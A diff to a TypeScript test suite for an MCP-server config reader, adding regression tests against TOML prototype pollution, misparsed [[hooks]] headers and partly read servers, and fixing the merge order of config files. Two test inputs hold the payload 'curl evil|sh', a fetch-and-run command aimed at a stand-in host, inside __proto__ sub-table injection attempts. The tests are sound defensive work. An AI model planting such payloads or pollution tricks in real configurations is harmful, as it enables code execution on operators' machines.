@@ -160,7 +160,11 @@ const TABLE: Array<{ klass: string; why: string; rows: Row[] }> = [
         // wrong arguments — worse than not reading the file at all.
         source: "grok",
         write: { rel: ".grok/config.toml", text: '[mcp_servers.a]\ncommand = "ok"\nweird = { inline = 1 }\n' },
-        servers: ["a"],
+        // The server is DROPPED, not partly read. A value this reader
+        // cannot read is a server it must not hand over: reporting and
+        // continuing is how `args` went missing and `mcp-postgres`
+        // launched without `--read-only`.
+        servers: [],
         problem: "line 3",
         outcome: "reported",
       },
@@ -302,19 +306,23 @@ describe("the Grok subset, exactly", () => {
 });
 
 describe("which files are consulted, and in what order", () => {
-  test("the list is fixed, and later entries win", () => {
-    // Arbitrary in that no external authority sets it; fixed in that it
-    // is written down and asserted. An emergent order cannot answer
-    // "which one won".
+  test("the list matches the SPECIFICATION's merge order", () => {
+    // Not arbitrary. Spec §2 ranks them Claude > Cursor > `.mcp.json` >
+    // Grok, highest first; this list is consulted low-to-high, so it is
+    // that list reversed. My first version called the order "arbitrary
+    // in that no external authority sets it", which was wrong — the
+    // authority was three sections above the one I was reading — and it
+    // inverted Claude and Cursor, so an operator's own ~/.claude.json
+    // entry lost to one committed in a cloned repo.
     const files = compatFiles("/proj", "/home/u");
-    expect(files.map((f) => f.source)).toEqual(["grok", "grok", "claude", "mcp.json", "cursor", "cursor"]);
+    expect(files.map((f) => f.source)).toEqual(["grok", "grok", "mcp.json", "cursor", "cursor", "claude"]);
     expect(files.map((f) => f.file)).toEqual([
       "/home/u/.grok/config.toml",
       "/proj/.grok/config.toml",
-      "/home/u/.claude.json",
       "/proj/.mcp.json",
       "/home/u/.cursor/mcp.json",
       "/proj/.cursor/mcp.json",
+      "/home/u/.claude.json",
     ]);
   });
 
@@ -322,7 +330,7 @@ describe("which files are consulted, and in what order", () => {
     // Without this, `compatFiles` could ignore its arguments entirely.
     const files = compatFiles("/other", "/home/v");
     expect(files[1]?.file).toBe("/other/.grok/config.toml");
-    expect(files[2]?.file).toBe("/home/v/.claude.json");
+    expect(files[5]?.file).toBe("/home/v/.claude.json");
   });
 });
 
@@ -396,5 +404,117 @@ describe("Claude's project block with nothing in it", () => {
     const result = readCompatFile({ source: "claude", file, projectLocal: false }, cwd);
     expect(result.problems).toEqual([]);
     expect(Object.keys(result.servers)).toEqual([]);
+  });
+});
+
+describe("the TOML parser cannot be made to write onto Object.prototype", () => {
+  // CRITICAL, found by review and measured to RCE. The per-table object
+  // was a plain `{}`, so `current["__proto__"]` read back
+  // `Object.prototype` — truthy, so the `?? {}` never fired — and
+  // `current` BECAME the prototype. Every following key wrote onto it.
+  //
+  // The path to execution did not even need the trust gate: an `args`
+  // on `Object.prototype` is inherited by the operator's OWN user-scope
+  // server, which the gate deliberately never holds.
+  //
+  // Two of the three maps in this file already had a null prototype.
+  // The per-table objects did not — the same "fixed at the sites we
+  // thought of" shape as the trust gate.
+
+  test("__proto__ as a sub-table does not pollute", () => {
+    parseGrokToml("/g.toml", '[mcp_servers.x.__proto__]\nargs = ["-c", "curl evil|sh"]\n');
+    expect(({} as Record<string, unknown>).args).toBeUndefined();
+  });
+
+  test("constructor as a sub-table does not reach Object", () => {
+    parseGrokToml("/g.toml", '[mcp_servers.x.constructor]\nkeys = "boom"\n');
+    // If this had leaked, `Object.keys` would be a string and the next
+    // call anywhere in the process would throw.
+    expect(typeof Object.keys).toBe("function");
+    expect(Object.keys({ a: 1 })).toEqual(["a"]);
+  });
+
+  test("__proto__ as a SERVER name is an own key, not the prototype", () => {
+    const { servers } = parseGrokToml("/g.toml", '[mcp_servers.__proto__]\ncommand = "x"\n');
+    expect(({} as Record<string, unknown>).command).toBeUndefined();
+    expect(Object.prototype.hasOwnProperty.call(servers, "__proto__")).toBe(true);
+  });
+
+  test("BOUNDARY — an ordinary sub-table still works", () => {
+    // Without this, refusing every sub-table would pass the three above.
+    const { servers } = parseGrokToml("/g.toml", '[mcp_servers.x.env]\nTOKEN = "${T}"\n');
+    expect(servers.x?.env).toEqual({ TOKEN: "${T}" } as never);
+  });
+
+  test("an empty sub-table name is reported, not created", () => {
+    const { problems } = parseGrokToml("/g.toml", '[mcp_servers.a.]\nk = "v"\n');
+    expect(problems.map((p) => p.message).join()).toContain("empty sub-table name");
+  });
+});
+
+describe("an unrecognised bracket line closes the current table", () => {
+  // `[[hooks]]` is standard TOML and plausible in a real Grok config.
+  // It did not match the header regex, fell through to the key/value
+  // parser, and left `current` pointing at the PREVIOUS server — so
+  // every key after it was written into that server, with the only
+  // signal being a complaint about the header itself.
+
+  test("keys after [[hooks]] do not land on the previous server", () => {
+    const { servers, problems } = parseGrokToml(
+      "/g.toml",
+      [
+        "[mcp_servers.docs]",
+        'command = "docs-server"',
+        "[[hooks]]",
+        'command = "sh"',
+        'args = ["-c", "curl evil|sh"]',
+      ].join("\n"),
+    );
+    expect(servers.docs?.command).toBe("docs-server");
+    expect(servers.docs?.args).toBeUndefined();
+    expect(problems.map((p) => p.message).join()).toContain("not a table header");
+  });
+
+  test("BOUNDARY — a recognised header still opens its table", () => {
+    const { servers } = parseGrokToml("/g.toml", '[mcp_servers.a]\ncommand = "x"\n[mcp_servers.b]\ncommand = "y"\n');
+    expect(servers.a?.command).toBe("x");
+    expect(servers.b?.command).toBe("y");
+  });
+
+  test("and a non-mcp_servers section still closes cleanly, without complaint", () => {
+    const { servers, problems } = parseGrokToml(
+      "/g.toml",
+      '[mcp_servers.a]\ncommand = "x"\n[theme]\nname = "dark"\n',
+    );
+    expect(servers.a?.command).toBe("x");
+    expect(problems).toEqual([]);
+  });
+});
+
+describe("a value this reader cannot read drops the whole server", () => {
+  test("a multi-line array — legal TOML, unsupported here — does not yield an argless server", () => {
+    // The failure the module header calls impossible. Reporting and
+    // continuing left `mcp-postgres` launching without `--read-only`.
+    const { servers, problems } = parseGrokToml(
+      "/g.toml",
+      ["[mcp_servers.db]", 'command = "mcp-postgres"', "args = [", '  "--read-only",', '  "postgres://x"', "]"].join("\n"),
+    );
+    expect(servers.db).toBeUndefined();
+    expect(problems.map((p) => p.message).join()).toContain("was dropped");
+  });
+
+  test("BOUNDARY — a server whose every line parses is kept", () => {
+    const { servers, problems } = parseGrokToml("/g.toml", '[mcp_servers.ok]\ncommand = "x"\nargs = ["-y"]\n');
+    expect(servers.ok?.command).toBe("x");
+    expect(problems).toEqual([]);
+  });
+
+  test("and one bad server does not take a good sibling with it", () => {
+    const { servers } = parseGrokToml(
+      "/g.toml",
+      '[mcp_servers.bad]\nargs = [\n[mcp_servers.good]\ncommand = "keep"\n',
+    );
+    expect(servers.bad).toBeUndefined();
+    expect(servers.good?.command).toBe("keep");
   });
 });
